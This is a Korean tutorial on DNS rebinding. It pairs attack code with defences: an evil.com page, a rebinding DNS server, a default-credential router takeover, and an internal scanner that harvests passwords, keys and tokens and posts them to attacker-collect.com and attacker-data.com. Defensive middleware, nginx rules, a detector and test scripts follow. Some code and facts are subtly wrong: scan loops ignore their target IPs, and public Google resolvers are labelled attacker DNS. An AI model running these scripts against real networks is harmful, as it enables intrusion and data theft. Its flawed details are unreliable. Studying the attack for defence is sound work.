# DNS Rebinding 취약점 분석

## 📋 취약점 개요

**DNS Rebinding**은 공격자가 DNS 응답을 조작하여 브라우저의 Same-Origin Policy를 우회하고, 사용자의 내부 네트워크나 로컬 서비스에 접근하는 공격 기법입니다. 공격자가 제어하는 도메인의 DNS 레코드를 조작하여 내부 IP 주소로 리디렉션시킴으로써 내부 네트워크 스캔이나 서비스 공격을 수행할 수 있습니다.

### 🎯 공격 원리

1. **DNS 조작**: 공격자 도메인의 DNS TTL을 매우 짧게 설정
2. **초기 연결**: 사용자가 공격자 사이트에 접속 시 정상 IP로 응답
3. **DNS 재바인딩**: 두 번째 요청에서 내부 IP로 DNS 응답 변경
4. **내부 접근**: Same-Origin Policy 우회로 내부 서비스에 접근

### 🔍 주요 위험성

- **CVSS 점수**: 8.0 (High)
- **내부 네트워크 스캔**: 방화벽 내부의 서비스 탐지
- **라우터 설정 변경**: 홈 라우터 관리 페이지 조작
- **내부 서비스 공격**: 내부 API나 데이터베이스 접근

## 🚨 공격 시나리오

### 시나리오 1: 기본 DNS Rebinding 공격

```html
<!-- 공격자 사이트 (evil.com) -->
<!DOCTYPE html>
<html>
<head>
    <title>DNS Rebinding Attack</title>
</head>
<body>
    <script>
        // 1단계: 정상적인 외부 서버로 연결 확인
        async function checkExternalConnection() {
            try {
                const response = await fetch('http://evil.com/status');
                console.log('External connection established');
                return true;
            } catch (e) {
                return false;
            }
        }
        
        // 2단계: DNS 캐시 만료 대기 후 내부 네트워크 스캔
        async function scanInternalNetwork() {
            const internalIPs = [
                '192.168.1.1',   // 일반적인 라우터
                '192.168.0.1',   // 일반적인 라우터
                '10.0.0.1',      // 기업 내부
                '172.16.0.1',    // 기업 내부
                '127.0.0.1'      // 로컬호스트
            ];
            
            for (const ip of internalIPs) {
                try {
                    // DNS Rebinding을 통해 내부 IP에 접근 시도
                    const response = await fetch(`http://evil.com:80/`, {
                        method: 'GET',
                        mode: 'no-cors'  // CORS 우회
                    });
                    
                    // 응답이 있으면 해당 IP에 서비스가 실행 중
                    console.log(`Service found at ${ip}`);
                    await extractData(ip);
                    
                } catch (e) {
                    console.log(`No service at ${ip}`);
                }
            }
        }
        
        // 3단계: 내부 서비스에서 데이터 추출
        async function extractData(targetIP) {
            try {
                // 라우터 관리 페이지 접근 시도
                const response = await fetch(`http://evil.com/admin`, {
                    credentials: 'include'  // 쿠키 포함
                });
                
                if (response.ok) {
                    const html = await response.text();
                    
                    // 민감한 정보 추출 (WiFi 설정, 네트워크 구성 등)
                    const wifiInfo = extractWiFiSettings(html);
                    const networkInfo = extractNetworkSettings(html);
                    
                    // 공격자 서버로 데이터 전송
                    await sendDataToAttacker({
                        targetIP,
                        wifiInfo,
                        networkInfo,
                        timestamp: new Date().toISOString()
                    });
                }
            } catch (e) {
                console.error('Data extraction failed:', e);
            }
        }
        
        async function sendDataToAttacker(data) {
            // 진짜 공격자 서버로 데이터 전송
            await fetch('https://attacker-collect.com/collect', {
                method: 'POST',
                body: JSON.stringify(data),
                headers: {
                    'Content-Type': 'application/json'
                }
            });
        }
        
        // 공격 실행
        setTimeout(async () => {
            if (await checkExternalConnection()) {
                // DNS TTL 만료 대기 (보통 1-60초)
                setTimeout(scanInternalNetwork, 10000);
            }
        }, 1000);
    </script>
</body>
</html>
```

### 시나리오 2: DNS 서버 설정 (공격자 인프라)

```python
# DNS 서버 설정 (공격자가 제어)
import dns.resolver
import dns.zone
from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE
import time

class RebindingDNSServer:
    def __init__(self):
        self.external_ip = "203.0.113.100"  # 공격자 서버 IP
        self.target_internal_ip = "192.168.1.1"  # 타겟 내부 IP
        self.request_count = {}
        
    def handle_dns_request(self, domain, client_ip):
        """DNS 요청 처리 - Rebinding 로직"""
        
        # 클라이언트별 요청 카운트 추적
        if client_ip not in self.request_count:
            self.request_count[client_ip] = 0
        
        self.request_count[client_ip] += 1
        
        # 첫 번째 요청: 외부 IP 반환
        if self.request_count[client_ip] == 1:
            return {
                'ip': self.external_ip,
                'ttl': 1,  # 매우 짧은 TTL (1초)
                'type': 'external'
            }
        
        # 두 번째 요청부터: 내부 IP 반환
        else:
            return {
                'ip': self.target_internal_ip,
                'ttl': 1,
                'type': 'rebinding'
            }
    
    def create_dns_response(self, query, client_ip):
        """DNS 응답 생성"""
        domain = str(query.q.qname)[:-1]  # 마지막 점 제거
        
        if domain == "evil.com":
            result = self.handle_dns_request(domain, client_ip)
            
            # DNS 응답 생성
            response = DNSRecord(
                DNSHeader(id=query.header.id, qr=1, aa=1, ra=1),
                q=query.q
            )
            
            # A 레코드 추가
            response.add_answer(
                RR(domain, QTYPE.A, ttl=result['ttl'], 
                   rdata=A(result['ip']))
            )
            
            print(f"DNS Response for {domain} from {client_ip}: "
                  f"{result['ip']} (TTL: {result['ttl']}, Type: {result['type']})")
            
            return response
        
        return None

# DNS 서버 실행
server = RebindingDNSServer()
# 실제 구현에서는 DNS 서버 바인딩 필요
```

### 시나리오 3: 라우터 설정 변경 공격

```javascript
// 라우터 관리 페이지 공격
async function routerAttack() {
    const commonRouterIPs = [
        '192.168.1.1',
        '192.168.0.1', 
        '10.0.0.1',
        '172.16.0.1'
    ];
    
    for (const ip of commonRouterIPs) {
        try {
            // DNS Rebinding을 통해 라우터에 접근
            const response = await fetch(`http://evil.com/`, {
                method: 'GET',
                credentials: 'include'
            });
            
            if (response.ok) {
                const html = await response.text();
                
                // 기본 로그인 정보로 시도
                const loginAttempts = [
                    {username: 'admin', password: 'admin'},
                    {username: 'admin', password: 'password'},
                    {username: 'admin', password: ''},
                    {username: 'root', password: 'root'}
                ];
                
                for (const creds of loginAttempts) {
                    if (await tryLogin(ip, creds)) {
                        // 성공시 악의적인 설정 변경
                        await changeRouterSettings(ip, creds);
                        break;
                    }
                }
            }
        } catch (e) {
            continue;
        }
    }
}

async function tryLogin(ip, credentials) {
    try {
        const loginData = new FormData();
        loginData.append('username', credentials.username);
        loginData.append('password', credentials.password);
        
        const response = await fetch(`http://evil.com/login.cgi`, {
            method: 'POST',
            body: loginData,
            credentials: 'include'
        });
        
        return response.ok && !response.url.includes('error');
    } catch {
        return false;
    }
}

async function changeRouterSettings(ip, credentials) {
    try {
        // DNS 설정을 공격자 서버로 변경
        const dnsSettings = {
            primary_dns: '8.8.4.4',    // 공격자 DNS 서버
            secondary_dns: '8.8.8.8',  // 공격자 DNS 서버
            enable_remote_management: '1'
        };
        
        // WiFi 패스워드 변경
        const wifiSettings = {
            wifi_password: 'hacked123!',
            guest_network: 'enabled',
            guest_password: 'guest123'
        };
        
        // 설정 변경 요청
        for (const [key, value] of Object.entries({...dnsSettings, ...wifiSettings})) {
            await fetch(`http://evil.com/set_config.cgi`, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `${key}=${encodeURIComponent(value)}`,
                credentials: 'include'
            });
        }
        
        console.log('Router settings successfully modified');
        
        // 변경된 설정 정보 수집
        await collectRouterInfo(ip);
        
    } catch (e) {
        console.error('Failed to modify router settings:', e);
    }
}
```

### 시나리오 4: 내부 API 서버 공격

```javascript
// 내부 서비스 스캔 및 공격
class InternalServiceScanner {
    constructor() {
        this.commonPorts = [80, 8080, 3000, 5000, 8000, 9000];
        this.commonEndpoints = [
            '/api/status',
            '/admin',
            '/health',
            '/metrics',
            '/config',
            '/api/v1/users'
        ];
    }
    
    async scanInternalServices() {
        const internalRanges = [
            '192.168.1.', '192.168.0.', '10.0.0.', '172.16.0.'
        ];
        
        for (const range of internalRanges) {
            for (let i = 1; i <= 254; i++) {
                const ip = range + i;
                await this.scanHost(ip);
            }
        }
    }
    
    async scanHost(ip) {
        for (const port of this.commonPorts) {
            try {
                // DNS Rebinding을 통한 내부 서비스 접근
                const response = await fetch(`http://evil.com:${port}/`, {
                    method: 'GET',
                    mode: 'no-cors',
                    timeout: 3000
                });
                
                if (response) {
                    console.log(`Service found: ${ip}:${port}`);
                    await this.exploitService(ip, port);
                }
            } catch (e) {
                // 서비스 없음
            }
        }
    }
    
    async exploitService(ip, port) {
        for (const endpoint of this.commonEndpoints) {
            try {
                const response = await fetch(`http://evil.com:${port}${endpoint}`, {
                    method: 'GET',
                    credentials: 'include'
                });
                
                if (response.ok) {
                    const data = await response.text();
                    
                    // 민감한 정보 추출
                    const sensitiveData = this.extractSensitiveInfo(data, endpoint);
                    
                    if (sensitiveData.length > 0) {
                        await this.exfiltrateData({
                            source: `${ip}:${port}${endpoint}`,
                            data: sensitiveData
                        });
                    }
                }
            } catch (e) {
                continue;
            }
        }
    }
    
    extractSensitiveInfo(html, endpoint) {
        const patterns = [
            /password["\s]*[:=]["\s]*([^"'\s]+)/gi,
            /api[_-]?key["\s]*[:=]["\s]*([^"'\s]+)/gi,
            /token["\s]*[:=]["\s]*([^"'\s]+)/gi,
            /secret["\s]*[:=]["\s]*([^"'\s]+)/gi,
            /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g  // IP addresses
        ];
        
        const found = [];
        for (const pattern of patterns) {
            const matches = html.match(pattern);
            if (matches) {
                found.push(...matches);
            }
        }
        
        return found;
    }
    
    async exfiltrateData(data) {
        try {
            await fetch('https://attacker-data.com/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        } catch (e) {
            // 데이터 전송 실패
        }
    }
}

// 스캔 시작
const scanner = new InternalServiceScanner();
setTimeout(() => scanner.scanInternalServices(), 5000);
```

## 🛡️ 방어 방법

### 1. DNS 레벨 방어

```php
<?php
// DNS Rebinding 방지 미들웨어
class DNSRebindingProtection {
    private $allowed_hosts;
    private $blocked_ranges;
    
    public function __construct() {
        $this->allowed_hosts = [
            $_SERVER['HTTP_HOST'],
            'api.example.com',
            'cdn.example.com'
        ];
        
        // 내부 IP 대역 차단
        $this->blocked_ranges = [
            '127.0.0.0/8',     // 로컬호스트
            '10.0.0.0/8',      // 클래스 A 사설
            '172.16.0.0/12',   // 클래스 B 사설
            '192.168.0.0/16',  // 클래스 C 사설
            '169.254.0.0/16',  // Link-local
            '224.0.0.0/4'      // 멀티캐스트
        ];
    }
    
    public function validateRequest($request) {
        $host = $request->getHost();
        
        // 1. Host 헤더 검증
        if (!$this->isAllowedHost($host)) {
            throw new SecurityException("Unauthorized host: $host");
        }
        
        // 2. DNS 해석 검증
        $resolved_ip = gethostbyname($host);
        if (!$this->isAllowedIP($resolved_ip)) {
            throw new SecurityException("Blocked IP resolved: $resolved_ip");
        }
        
        // 3. Referrer 검증
        $referrer = $request->getHeader('Referer');
        if ($referrer && !$this->isValidReferrer($referrer)) {
            throw new SecurityException("Invalid referrer: $referrer");
        }
        
        return true;
    }
    
    private function isAllowedHost($host) {
        // 허용된 호스트 목록 확인
        return in_array($host, $this->allowed_hosts);
    }
    
    private function isAllowedIP($ip) {
        // IP 주소 유효성 검사
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return false;
        }
        
        // 내부 IP 대역 차단
        foreach ($this->blocked_ranges as $range) {
            if ($this->ipInRange($ip, $range)) {
                return false;
            }
        }
        
        return true;
    }
    
    private function ipInRange($ip, $range) {
        list($subnet, $bits) = explode('/', $range);
        
        $ip_long = ip2long($ip);
        $subnet_long = ip2long($subnet);
        $mask = -1 << (32 - $bits);
        
        return ($ip_long & $mask) == ($subnet_long & $mask);
    }
    
    private function isValidReferrer($referrer) {
        $parsed = parse_url($referrer);
        
        if (!$parsed || !isset($parsed['host'])) {
            return false;
        }
        
        return $this->isAllowedHost($parsed['host']);
    }
    
    public function setSecureHeaders($response) {
        // DNS prefetch 방지
        $response->setHeader('X-DNS-Prefetch-Control', 'off');
        
        // 엄격한 전송 보안
        $response->setHeader('Strict-Transport-Security', 
                           'max-age=31536000; includeSubDomains; preload');
        
        // 콘텐츠 타입 스니핑 방지
        $response->setHeader('X-Content-Type-Options', 'nosniff');
        
        // 프레임 차단
        $response->setHeader('X-Frame-Options', 'DENY');
        
        return $response;
    }
}

// 사용 예제
$protection = new DNSRebindingProtection();

try {
    $protection->validateRequest($request);
    
    // 정상 요청 처리
    $response = handleRequest($request);
    
    // 보안 헤더 설정
    $response = $protection->setSecureHeaders($response);
    
} catch (SecurityException $e) {
    // 보안 위협 차단
    error_log('DNS Rebinding attack blocked: ' . $e->getMessage());
    
    http_response_code(403);
    exit('Request blocked for security reasons');
}
?>
```

### 2. 브라우저 레벨 방어

```html
<!-- Content Security Policy로 DNS Rebinding 방지 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self' https:; 
               connect-src 'self' https: wss: ws:;
               form-action 'self';
               frame-ancestors 'none';
               base-uri 'self';">

<!-- DNS prefetch 차단 -->
<meta http-equiv="x-dns-prefetch-control" content="off">

<!-- Referrer Policy -->
<meta name="referrer" content="strict-origin-when-cross-origin">

<script>
// 클라이언트 사이드 DNS Rebinding 방지
class ClientSideDNSProtection {
    constructor() {
        this.allowedHosts = ['example.com', 'api.example.com'];
        this.blockedIPs = [
            /^127\./,           // 127.x.x.x
            /^10\./,            // 10.x.x.x
            /^172\.(1[6-9]|2\d|3[01])\./,  // 172.16.x.x - 172.31.x.x
            /^192\.168\./,      // 192.168.x.x
            /^169\.254\./       // 169.254.x.x
        ];
    }
    
    async validateURL(url) {
        try {
            const parsedURL = new URL(url);
            
            // 1. 호스트 검증
            if (!this.allowedHosts.includes(parsedURL.hostname)) {
                throw new Error('Unauthorized host');
            }
            
            // 2. DNS 해석 검증 (가능한 경우)
            if (this.isIPAddress(parsedURL.hostname)) {
                if (this.isBlockedIP(parsedURL.hostname)) {
                    throw new Error('Blocked IP address');
                }
            }
            
            // 3. 프로토콜 검증
            if (!['https:', 'http:'].includes(parsedURL.protocol)) {
                throw new Error('Invalid protocol');
            }
            
            return true;
        } catch (e) {
            console.warn('URL validation failed:', e.message);
            return false;
        }
    }
    
    isIPAddress(hostname) {
        const ipPattern = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
        return ipPattern.test(hostname);
    }
    
    isBlockedIP(ip) {
        return this.blockedIPs.some(pattern => pattern.test(ip));
    }
    
    // fetch API 래퍼
    async safeFetch(url, options = {}) {
        if (!(await this.validateURL(url))) {
            throw new Error('DNS Rebinding attempt detected');
        }
        
        // 추가 보안 옵션
        const secureOptions = {
            ...options,
            mode: 'cors',
            credentials: 'same-origin',
            referrerPolicy: 'strict-origin-when-cross-origin'
        };
        
        return fetch(url, secureOptions);
    }
    
    // XMLHttpRequest 래퍼
    createSecureXHR() {
        const xhr = new XMLHttpRequest();
        const originalOpen = xhr.open.bind(xhr);
        
        xhr.open = async (method, url, async = true, user, password) => {
            if (!(await this.validateURL(url))) {
                throw new Error('DNS Rebinding attempt detected');
            }
            
            return originalOpen(method, url, async, user, password);
        };
        
        return xhr;
    }
}

// 전역 보호 객체 생성
const dnsProtection = new ClientSideDNSProtection();

// fetch API 오버라이드
const originalFetch = window.fetch;
window.fetch = async function(url, options) {
    return dnsProtection.safeFetch(url, options);
};

// XMLHttpRequest 오버라이드
const OriginalXHR = window.XMLHttpRequest;
window.XMLHttpRequest = function() {
    return dnsProtection.createSecureXHR();
};
</script>
```

### 3. 네트워크 레벨 방어

```nginx
# Nginx 설정으로 DNS Rebinding 방지
server {
    listen 80;
    listen 443 ssl;
    server_name example.com api.example.com;
    
    # DNS Rebinding 방지 헤더
    add_header X-DNS-Prefetch-Control off always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-Frame-Options DENY always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Host 헤더 검증
    if ($host !~ ^(example\.com|api\.example\.com)$) {
        return 444;  # Nginx에서 연결 종료
    }
    
    # 내부 IP 접근 차단
    location / {
        # 프록시 설정에서 내부 IP 해석 방지
        resolver 8.8.8.8 8.8.4.4 valid=300s;
        resolver_timeout 5s;
        
        proxy_pass http://backend;
        proxy_set_header Host $http_host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # DNS Rebinding 공격 탐지
        access_by_lua_block {
            local host = ngx.var.http_host
            local allowed_hosts = {"example.com", "api.example.com"}
            
            local function contains(table, element)
                for _, value in pairs(table) do
                    if value == element then
                        return true
                    end
                end
                return false
            end
            
            if not contains(allowed_hosts, host) then
                ngx.log(ngx.ERR, "DNS Rebinding attack from: " .. ngx.var.remote_addr)
                ngx.status = 403
                ngx.say("Access denied")
                ngx.exit(403)
            end
        }
    }
}
```

### 4. 애플리케이션 레벨 모니터링

```python
import ipaddress
import socket
import logging
from urllib.parse import urlparse

class DNSRebindingDetector:
    def __init__(self):
        self.allowed_domains = ['example.com', 'api.example.com']
        self.private_ranges = [
            ipaddress.IPv4Network('127.0.0.0/8'),
            ipaddress.IPv4Network('10.0.0.0/8'),
            ipaddress.IPv4Network('172.16.0.0/12'),
            ipaddress.IPv4Network('192.168.0.0/16'),
            ipaddress.IPv4Network('169.254.0.0/16')
        ]
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    def analyze_request(self, request_data):
        """요청 분석 및 DNS Rebinding 탐지"""
        
        analysis = {
            'timestamp': request_data['timestamp'],
            'client_ip': request_data['client_ip'],
            'host_header': request_data['host'],
            'user_agent': request_data['user_agent'],
            'referrer': request_data.get('referrer', ''),
            'risk_score': 0,
            'indicators': []
        }
        
        # 1. Host 헤더 검증
        if not self.is_allowed_domain(analysis['host_header']):
            analysis['risk_score'] += 50
            analysis['indicators'].append('unauthorized_host')
        
        # 2. DNS 해석 검증
        try:
            resolved_ip = socket.gethostbyname(analysis['host_header'])
            if self.is_private_ip(resolved_ip):
                analysis['risk_score'] += 80
                analysis['indicators'].append('private_ip_resolution')
                analysis['resolved_ip'] = resolved_ip
        except socket.gaierror:
            analysis['risk_score'] += 30
            analysis['indicators'].append('dns_resolution_failed')
        
        # 3. Referrer 검증
        if analysis['referrer']:
            referrer_host = urlparse(analysis['referrer']).netloc
            if referrer_host and not self.is_allowed_domain(referrer_host):
                analysis['risk_score'] += 40
                analysis['indicators'].append('suspicious_referrer')
        
        # 4. User-Agent 패턴 분석
        if self.is_suspicious_user_agent(analysis['user_agent']):
            analysis['risk_score'] += 20
            analysis['indicators'].append('suspicious_user_agent')
        
        # 5. 시간 패턴 분석 (동일 IP에서 짧은 간격 요청)
        if self.check_timing_patterns(analysis['client_ip']):
            analysis['risk_score'] += 30
            analysis['indicators'].append('rapid_requests')
        
        # 위험도 평가
        if analysis['risk_score'] >= 80:
            analysis['threat_level'] = 'HIGH'
            self.logger.warning(f"High risk DNS rebinding detected: {analysis}")
        elif analysis['risk_score'] >= 50:
            analysis['threat_level'] = 'MEDIUM'
            self.logger.info(f"Medium risk DNS rebinding detected: {analysis}")
        else:
            analysis['threat_level'] = 'LOW'
        
        return analysis
    
    def is_allowed_domain(self, domain):
        """허용된 도메인 확인"""
        domain = domain.lower()
        return any(domain == allowed or domain.endswith('.' + allowed) 
                  for allowed in self.allowed_domains)
    
    def is_private_ip(self, ip_str):
        """사설 IP 확인"""
        try:
            ip = ipaddress.IPv4Address(ip_str)
            return any(ip in network for network in self.private_ranges)
        except ipaddress.AddressValueError:
            return False
    
    def is_suspicious_user_agent(self, user_agent):
        """의심스러운 User-Agent 패턴"""
        suspicious_patterns = [
            'curl', 'wget', 'python-requests', 'go-http-client',
            'Mozilla/5.0 (compatible; MSIE', 'Bot', 'Spider'
        ]
        
        return any(pattern.lower() in user_agent.lower() 
                  for pattern in suspicious_patterns)
    
    def check_timing_patterns(self, client_ip):
        """요청 타이밍 패턴 분석"""
        # Redis나 메모리 캐시에서 최근 요청 확인
        # 구현 시 실제 캐시 시스템 사용
        return False  # 예시용
    
    def generate_alert(self, analysis):
        """보안 알림 생성"""
        if analysis['threat_level'] in ['HIGH', 'MEDIUM']:
            alert_data = {
                'type': 'dns_rebinding_detected',
                'severity': analysis['threat_level'],
                'client_ip': analysis['client_ip'],
                'host': analysis['host_header'],
                'risk_score': analysis['risk_score'],
                'indicators': analysis['indicators'],
                'timestamp': analysis['timestamp']
            }
            
            # 알림 시스템으로 전송 (Slack, Email 등)
            self.send_security_alert(alert_data)
    
    def send_security_alert(self, alert_data):
        """보안 알림 전송"""
        # 실제 알림 시스템 연동
        self.logger.critical(f"SECURITY ALERT: {alert_data}")

# 사용 예제
detector = DNSRebindingDetector()

# 요청 분석
request_data = {
    'timestamp': '2023-01-01T12:00:00Z',
    'client_ip': '203.0.113.1',
    'host': 'evil.com',
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'referrer': 'https://legitimate-site.com'
}

analysis = detector.analyze_request(request_data)
detector.generate_alert(analysis)
```

## 🧪 테스트 방법

### 1. DNS Rebinding 시뮬레이션

```python
import dns.resolver
import requests
import time

class DNSRebindingTester:
    def __init__(self, target_domain, internal_targets):
        self.target_domain = target_domain
        self.internal_targets = internal_targets
        self.test_results = []
    
    def test_dns_rebinding_vulnerability(self):
        """DNS Rebinding 취약점 테스트"""
        
        print(f"Testing DNS Rebinding for {self.target_domain}")
        
        for internal_ip in self.internal_targets:
            result = self.test_internal_access(internal_ip)
            self.test_results.append(result)
        
        return self.generate_report()
    
    def test_internal_access(self, internal_ip):
        """내부 IP 접근 테스트"""
        
        test_result = {
            'target_ip': internal_ip,
            'accessible': False,
            'services_found': [],
            'response_times': [],
            'error_messages': []
        }
        
        # 일반적인 포트 스캔
        common_ports = [80, 8080, 443, 8443, 3000, 5000, 8000]
        
        for port in common_ports:
            try:
                start_time = time.time()
                
                # 실제 DNS Rebinding 시도 시뮬레이션
                response = requests.get(
                    f'http://{self.target_domain}:{port}/',
                    timeout=5,
                    allow_redirects=False
                )
                
                response_time = time.time() - start_time
                test_result['response_times'].append(response_time)
                
                if response.status_code == 200:
                    test_result['accessible'] = True
                    test_result['services_found'].append({
                        'port': port,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'headers': dict(response.headers)
                    })
                
            except requests.exceptions.Timeout:
                test_result['error_messages'].append(f'Timeout on port {port}')
            except requests.exceptions.ConnectionError:
                test_result['error_messages'].append(f'Connection refused on port {port}')
            except Exception as e:
                test_result['error_messages'].append(f'Error on port {port}: {str(e)}')
        
        return test_result
    
    def generate_report(self):
        """테스트 결과 보고서 생성"""
        
        accessible_targets = [r for r in self.test_results if r['accessible']]
        total_services = sum(len(r['services_found']) for r in self.test_results)
        
        report = {
            'summary': {
                'total_targets_tested': len(self.internal_targets),
                'accessible_targets': len(accessible_targets),
                'total_services_found': total_services,
                'vulnerability_rating': self.calculate_risk_rating(accessible_targets)
            },
            'detailed_results': self.test_results,
            'recommendations': self.get_recommendations(accessible_targets)
        }
        
        self.print_report(report)
        return report
    
    def calculate_risk_rating(self, accessible_targets):
        """위험도 평가"""
        if len(accessible_targets) == 0:
            return 'LOW'
        elif len(accessible_targets) <= 2:
            return 'MEDIUM'
        else:
            return 'HIGH'
    
    def get_recommendations(self, accessible_targets):
        """보안 권장사항"""
        recommendations = [
            'Implement strict Host header validation',
            'Use Content Security Policy (CSP)',
            'Deploy DNS rebinding protection at network level',
            'Monitor for suspicious DNS queries'
        ]
        
        if accessible_targets:
            recommendations.extend([
                'Block access to private IP ranges',
                'Implement application-level IP filtering',
                'Use authentication for internal services'
            ])
        
        return recommendations
    
    def print_report(self, report):
        """보고서 출력"""
        print("\n" + "="*60)
        print("DNS REBINDING VULNERABILITY TEST REPORT")
        print("="*60)
        
        print(f"\nSUMMARY:")
        print(f"  Total targets tested: {report['summary']['total_targets_tested']}")
        print(f"  Accessible targets: {report['summary']['accessible_targets']}")
        print(f"  Services found: {report['summary']['total_services_found']}")
        print(f"  Risk rating: {report['summary']['vulnerability_rating']}")
        
        if report['summary']['accessible_targets'] > 0:
            print(f"\nVULNERABLE TARGETS:")
            for result in report['detailed_results']:
                if result['accessible']:
                    print(f"  {result['target_ip']}: {len(result['services_found'])} services")
        
        print(f"\nRECOMMENDATIONS:")
        for i, rec in enumerate(report['recommendations'], 1):
            print(f"  {i}. {rec}")

# 테스트 실행 예제
if __name__ == "__main__":
    tester = DNSRebindingTester(
        target_domain='test-rebinding.com',
        internal_targets=['192.168.1.1', '10.0.0.1', '172.16.0.1', '127.0.0.1']
    )
    
    # 주의: 실제 테스트는 허가된 환경에서만 수행
    # results = tester.test_dns_rebinding_vulnerability()
```

### 2. 방어 시스템 테스트

```bash
#!/bin/bash
# DNS Rebinding 방어 시스템 테스트 스크립트

echo "DNS Rebinding Protection Test Suite"
echo "=================================="

TARGET_URL="http://localhost:8080"
TEST_DOMAIN="test-evil.com"
INTERNAL_IPS=("192.168.1.1" "10.0.0.1" "127.0.0.1")

# 1. Host 헤더 검증 테스트
echo "1. Testing Host header validation..."
curl -H "Host: evil.com" $TARGET_URL -v 2>&1 | grep -E "(403|blocked|denied)" && echo "✅ Host validation working" || echo "❌ Host validation failed"

# 2. 내부 IP 접근 테스트
echo "2. Testing internal IP access blocking..."
for ip in "${INTERNAL_IPS[@]}"; do
    echo "Testing $ip..."
    curl -H "Host: $ip" $TARGET_URL -v 2>&1 | grep -E "(403|blocked|denied)" && echo "✅ $ip blocked" || echo "❌ $ip accessible"
done

# 3. DNS 해석 테스트
echo "3. Testing DNS resolution blocking..."
# 실제 DNS 서버 설정이 필요한 고급 테스트

# 4. CSP 헤더 확인
echo "4. Testing CSP headers..."
curl -I $TARGET_URL | grep -i "content-security-policy" && echo "✅ CSP header present" || echo "❌ CSP header missing"

# 5. 브라우저 자동화 테스트 (Selenium 필요)
if command -v python3 &> /dev/null; then
    python3 << 'EOF'
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    
    driver = webdriver.Chrome(options=chrome_options)
    
    # DNS Rebinding 시뮬레이션
    driver.get("http://localhost:8080")
    
    # JavaScript로 내부 네트워크 접근 시도
    script = """
    return fetch('http://192.168.1.1')
        .then(response => 'accessible')
        .catch(error => 'blocked');
    """
    
    result = driver.execute_async_script(script)
    print(f"5. Browser-level test: {result}")
    
    driver.quit()
    
except ImportError:
    print("5. Selenium not available - skipping browser tests")
except Exception as e:
    print(f"5. Browser test failed: {e}")
EOF
fi

echo "Test completed."
```

## 📚 참고 자료

### 공식 문서
- [OWASP DNS Rebinding](https://owasp.org/www-community/attacks/DNS_Rebinding)
- [RFC 1918 - Private Internet Addresses](https://tools.ietf.org/html/rfc1918)

### 보안 가이드
- [PortSwigger DNS Rebinding](https://portswigger.net/web-security/cors/same-origin-policy)
- [Mozilla CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### 도구 및 리소스
- [Burp Suite Collaborator](https://portswigger.net/burp/documentation/collaborator)
- [DNS Rebinding Toolkit](https://github.com/nccgroup/singularity)

---

## 🎯 핵심 요약

1. **Host 헤더 검증**: 요청의 Host 헤더가 허용된 도메인인지 확인
2. **DNS 해석 차단**: 내부 IP 대역으로 해석되는 요청 차단
3. **네트워크 레벨 방어**: 방화벽이나 프록시에서 내부 IP 접근 차단
4. **모니터링**: DNS 쿼리 패턴과 의심스러운 요청 실시간 감지

**⚠️ 주의**: DNS Rebinding은 네트워크 경계를 넘나드는 공격이므로 다층 방어가 필수입니다.